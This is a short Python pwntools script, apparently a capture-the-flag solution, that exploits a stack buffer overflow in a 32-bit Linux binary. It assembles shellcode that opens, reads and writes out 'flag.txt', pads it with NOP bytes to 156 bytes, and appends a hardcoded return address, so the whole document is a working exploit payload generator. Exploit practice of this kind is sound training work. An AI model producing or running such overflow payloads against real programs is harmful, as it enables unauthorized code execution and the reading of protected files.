from pwn import *

context.arch = 'i386'

def exploit():
    shellcode = """
                mov esp, esi
                add esp, 0x100
                """
    shellcode += shellcraft.linux.open("flag.txt") 
    shellcode += shellcraft.linux.read("eax", "esp", 0x200) 
    shellcode += shellcraft.linux.write(0, "esp", 0x200)

    padding = 156

    payload = ''
    payload += asm(shellcode)
    payload += '\x90' * (padding - len(payload))
    payload += p32(0x804a570)
    print payload

if __name__ == "__main__":
    exploit()
